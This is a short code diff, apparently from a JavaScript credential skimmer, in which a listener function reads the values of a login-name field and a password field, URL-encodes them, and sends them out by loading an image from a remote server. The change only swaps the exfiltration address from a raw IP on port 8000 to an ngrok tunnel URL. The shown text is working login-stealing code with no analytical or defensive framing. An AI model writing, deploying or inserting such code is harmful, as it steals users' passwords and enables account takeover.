@@ -13,7 +13,7 @@ function frimframlistener(){
 		un = frimframdoc.querySelector('#loginName').value;
 		imag = document.createElement('img');
 		fin = encodeURIComponent('pwd='+pw+'&usr='+un);
-		imag.src = 'http://74.14.159.250:8000/?' + fin;
+		imag.src = 'https://a090-74-14-159-250.ngrok-free.app/?' + fin;
 		document.body.appendChild(imag);
 	}catch(error){
 		console.error(error);
